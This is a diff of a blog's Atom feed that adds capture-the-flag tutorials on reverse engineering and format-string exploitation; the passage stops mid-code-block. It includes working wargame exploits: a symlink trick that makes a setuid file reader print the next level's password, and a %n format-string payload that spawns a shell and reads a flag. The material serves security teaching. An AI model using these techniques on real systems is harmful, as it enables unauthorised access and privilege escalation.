@@ -4,7 +4,7 @@
   <title><![CDATA[tech.bitvijays.com]]></title>
   <link href="http://bitvijays.github.io/atom.xml" rel="self"/>
   <link href="http://bitvijays.github.io/"/>
-  <updated>2014-11-30T11:16:29+00:00</updated>
+  <updated>2015-01-02T23:38:03+00:00</updated>
   <id>http://bitvijays.github.io/</id>
   <author>
     <name><![CDATA[Vijay Kumar]]></name>
@@ -14,7 +14,153 @@
 
   
   <entry>
-    <title type="html"><![CDATA[Learning From CTF: Binary Exploitation]]></title>
+    <title type="html"><![CDATA[Learning From CTF : Reverse Engineering]]></title>
+    <link href="http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering/"/>
+    <updated>2015-01-02T03:15:59+00:00</updated>
+    <id>http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering</id>
+    <content type="html"><![CDATA[<p>This post lists the learnings from the CTF while doing Reverse Engineering.</p>
+
+<!-- more -->
+
+
+<p>If we are provided with a binary to reverse engineer, for example asking for password.</p>
+
+<ol>
+
+<li>
+file: The first step is to run file command on the binary which would tell us whether it is 32/64 bit or statically/dynamically linked etc.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~/Desktop/CTF/31C3$ file cfy 
+</span><span class='line'>cfy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9bc623f046535fba50a2124909fb871e5daf198e, not stripped</span></code></pre></td></tr></table></div></figure>
+</li>
+<li>
+The second step could be running strings or &#8220;hexdump -C&#8221; on it, specially in the case of very simple re challenges like asking for password and stored in an array.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ strings check 
+</span><span class='line'>/lib/ld-linux.so.2
+</span><span class='line'>D$,1
+</span><span class='line'>D$%secrf
+</span><span class='line'>D$)et
+</span><span class='line'>D$ love
+</span><span class='line'>T$,e3
+</span><span class='line'>[^_]
+</span><span class='line'>password: 
+</span><span class='line'>/bin/sh
+</span><span class='line'>Wrong password, Good Bye ...
+</span><span class='line'>;*2$"</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hexdump -C check | more 
+</span><span class='line'>00000540  31 c0 c7 44 24 18 73 65  78 00 c7 44 24 25 73 65  |1..D$.sec..D$%se|
+</span><span class='line'>00000550  63 72 66 c7 44 24 29 65  74 c6 44 24 2b 00 c7 44  |crf.D$)et.D$+..D|
+</span><span class='line'>00000560  24 1c 67 6f 64 00 c7 44  24 20 6c 6f 76 65 c6 44  |$.god..D$ love.D|</span></code></pre></td></tr></table></div></figure>
+</li>
+
+<li>
+The next step could be running strace or ltrace on the binary.
+
+strace: trace system calls and signals
+ltrace: A library call tracer
+</li>
+
+
+</ol>
+
+
+<h3>Examples</h3>
+
+<ol>
+<li>Consider a binary which is setuid and used to read files.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile 
+</span><span class='line'>*** File Printer ***
+</span><span class='line'>Usage: ./printfile filename
+</span><span class='line'>
+</span><span class='line'>leviathan2@melinda:~$ ls -la
+</span><span class='line'>-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14 10:32 printfile</span></code></pre></td></tr></table></div></figure>
+We need to read 
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ls -l /etc/leviathan_pass/leviathan3 
+</span><span class='line'>-r-------- 1 leviathan3 leviathan3 11 Nov 14 10:32 /etc/leviathan_pass/leviathan3</span></code></pre></td></tr></table></div></figure>
+Let&#8217;s see the ltrace of the binary while accessing a file which we are allowed to read
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2 
+</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
+</span><span class='line'>access("/etc/leviathan_pass/leviathan2", 4)                                                                            = 0
+</span><span class='line'>snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                  = 39
+</span><span class='line'>system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
+</span><span class='line'> &lt;no return ...&gt;
+</span><span class='line'>--- SIGCHLD (Child exited) ---
+</span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 0
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+Let see what happen when we try to access file which we don&#8217;t have permission to.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
+</span><span class='line'>access("/etc/leviathan_pass/leviathan3", 4)                                                                            = -1
+</span><span class='line'>puts("You cant have that file..."You cant have that file...
+</span><span class='line'>)                                                                                     = 27
+</span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>
+So it&#8217;s a matter of tricking access(), if the call to access() succeeds then it calls system(&#8220;cat file&#8221;), so if pass the argument printfile /etc/issue, then it works.
+We can get around it by using a space in our file name. Eg: touch foo\ bar. then we create a symlink to the password file and call it foo. ln -s /etc/leviathanpass/leviathan3 foo
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ mkdir /tmp/levi
+</span><span class='line'>leviathan2@melinda:~$ cd /tmp/levi
+</span><span class='line'>leviathan2@melinda:/tmp/levi$ ls
+</span><span class='line'>leviathan2@melinda:/tmp/levi$ ln -s /etc/leviathan_pass/leviathan3 ./foo
+</span><span class='line'>leviathan2@melinda:/tmp/levi$ touch foo\ bar
+</span><span class='line'>leviathan2@melinda:/tmp/levi$ ~/printfile foo\ bar 
+</span><span class='line'>Ahdiemoo1j
+</span><span class='line'>/bin/cat: bar: No such file or directory</span></code></pre></td></tr></table></div></figure>
+</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Learning From CTF : Binary Exploitation]]></title>
     <link href="http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation/"/>
     <updated>2014-11-09T20:42:01+00:00</updated>
     <id>http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation</id>
@@ -39,10 +185,80 @@ Big-endian systems store the most significant byte of a word in the smallest add
 <li>Whether the binary is compiled for 32 bit or 64 bit (file binary_file)</li>
 <li>Buffer overflow prevention techniques such as RELRO, NoExecute (NX), Stack Canaries, Address Space Layout Randomization (ASLR) and Position Independent Executables (PIE) can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
 <li>Whether the stack of binary is executable is not can be found by readelf tool. IF Program header GNU_STACK has RWE flag, if it has E flag, it&#8217;s executable.</li>
+<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
+<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. run gdb <program>, p &<variablename>. </li>
 </ul>
 </li>
 
-<li>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it. run gdb <program>, p &<variablename>. For example, below you need the address of secret to write the new value 0x1337beef.
+
+<li>Format String Vulnerability:
+
+<ul>
+<li>Whatis: If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parame-
+ters.
+Example:
+printf (&#8220;The magic number is: %d\n&#8221;, 1911);</li>
+
+<li>The behaviour of the format function is controlled by the format string. The
+function retrieves the parameters requested by the format string from the
+stack.
+printf (&#8220;Number %d has no address, number %d has: %08x\n&#8221;, i, a, &a);
+From within the printf function the stack looks like:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>stack top
+</span><span class='line'>. . .
+</span><span class='line'>&lt;&a&gt;
+</span><span class='line'>&lt;a&gt;
+</span><span class='line'>&lt;i&gt;
+</span><span class='line'>A
+</span><span class='line'>. . .
+</span><span class='line'>stack bottom</span></code></pre></td></tr></table></div></figure></li>
+<li>Crashing the Program: By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like: printf (&#8220;%s%s%s%s%s%s%s%s%s%s%s%s&#8221;);
+Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</li>
+<li>Viewing the stack: how some parts of the stack memory by using a format string like this: printf (&#8220;%08x.%08x.%08x.%08x.%08x\n&#8221;);
+This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:
+40012980.080628c4.bffff7a4.00000005.08059c04 This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards
+the low addresses.</li>
+
+<li>Viewing Memory at any location: It is possible to peek at memory locations different from the stack memory. To do this we have to get the format function to display memory from an address we can supply. This poses two problems to us: First, we have to find a format parameter which uses an address (by reference) as stack parameter and displays memory from there, and we have to supply that address. We are lucky in the first case, since the ‘%s’ parameter just does that, it displays memory — usually an ASCIIZ string — from a stack-supplied address. So the remaining problem is, how to get that address on the stack, into the right place.
+
+Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. 2 The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:
+printf (&#8220;AAA0AAA1_%08x.%08x.%08x.%08x.%08x&#8221;);
+The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string.
+In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one.
+Example:
+address = 0x08480110
+address (encoded as 32 bit le string): &#8220;\x10\x01\x48\x08&#8221; printf (&#8220;\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|&#8221;);
+Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.
+</li>
+
+<li>Overwriting of Arbitrary Memory: There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) 
+at the address: &#8220;\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n&#8221; The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter
+written by ‘%n’, at least a bit. </li>
+
+<li>Direct Parameter Access: The direct parameter access is controlled by the ‘$’ qualifier: printf (&#8220;%6$d\n&#8221;, 6, 5, 4, 3, 2, 1); Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.
+</li>
+</ul>
+
+
+Aanother example of picoctf 2014, best_shell can be read at <a href="https://ctf-team.vulnhub.com/picoctf-2014-best-shell/">Best shell</a>.
+
+</li>
+</ol>
+
+
+<h3>Examples</h3>
+
+<ol>
+<li>
+For example, below you need the address of secret to write the new value 0x1337beef.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -97,7 +313,8 @@ Big-endian systems store the most significant byte of a word in the smallest add
 </span><span class='line'>    <span class="p">}</span>
 </span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;My secret is still safe! Sorry.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
 </span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></li>
+</span></code></pre></td></tr></table></div></figure>
+</li>
 
 <li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can&#8217;t be printed as ASCII characters, you can use python to pass the input.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -202,14 +419,11 @@ In the below challenge, an attacker can use a buffer overflow to take control of
 </span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></li>
-
 <li> Execute Me:
 If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
 
 If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
 <ul>
-<li>We should first check that executable binary is running on whether x86 or x86-64. (uname - a)</li>
-<li>Then, we should check whether the binary is compiled for 32 bit or 64 bit (file <binary file>)</li>
 <li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
 <li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
 </ul>
@@ -257,7 +471,6 @@ If you see, read function read the stdin into the buffer and (function_ptf) buf(
 </span><span class='line'>    <span class="p">((</span><span class="n">function_ptr</span><span class="p">)</span><span class="n">buf</span><span class="p">)();</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></li>
-
 
 <li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?
 
@@ -322,13 +535,350 @@ From the code provided we can see that there’s a buffer overflow in the vuln()
 </span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure></li>
+
+</ol>
+
+
+<h3>Format String Examples</h3>
+
+<ol>
+<li>
+In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
+</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">secret</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">){</span>
+</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+Reading the address
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ gdb -q format
+</span><span class='line'>Reading symbols from format...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) p $secret
+</span><span class='line'>$1 = void
+</span><span class='line'>(gdb) p &secret
+</span><span class='line'>$2 = (&lt;data variable, no debug info&gt; *) 0x804a030 &lt;secret&gt;</span></code></pre></td></tr></table></div></figure>
+Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+</span><span class='line'>ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000</span></code></pre></td></tr></table></div></figure>
+We see that the address is present on the stack at the seventh position.
+
+Otherwise, we can put it on the stack by
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141</span></code></pre></td></tr></table></div></figure>
+What this is doing is &#8220;Extracting particular stack content by &#8220;%$i\$x&#8221;. As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>or i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
+</span><span class='line'>Offset: 103:AAAA41410074
+</span><span class='line'>Offset: 104:AAAA31254141</span></code></pre></td></tr></table></div></figure>
+So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
+</span><span class='line'>Offset: 103:AAAA41414141</span></code></pre></td></tr></table></div></figure>
+It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
+</span><span class='line'>$ id
+</span><span class='line'>uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
+</span><span class='line'>$ ls
+</span><span class='line'>Makefile  flag.txt  format  format.c
+</span><span class='line'>$ cat flag.txt
+</span><span class='line'>who_thought_%n_was_a_good_idea?</span></code></pre></td></tr></table></div></figure>
+Otherwise as the address at the seventh is already present on stack we can also do
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format "%1337u%7\$n"</span></code></pre></td></tr></table></div></figure>
+We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic 
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./format %08x.%08x.%08x.%08x.%08x.%1292u%n</span></code></pre></td></tr></table></div></figure>
+If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see &#8220;%08x.&#8221; is of eight characters + 1 of &#8220;.&#8221; or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.
+
+</li>
+
+<li>
+In another example below,
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define BUFSIZE 256</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">greet</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What is your name?&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">!&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
+</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;How long is your name?&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">BUFSIZE</span><span class="p">)</span> <span class="c1">//don&#39;t allow buffer overflow</span>
+</span><span class='line'>        <span class="n">greet</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Length was too long!&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there&#8217;s any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
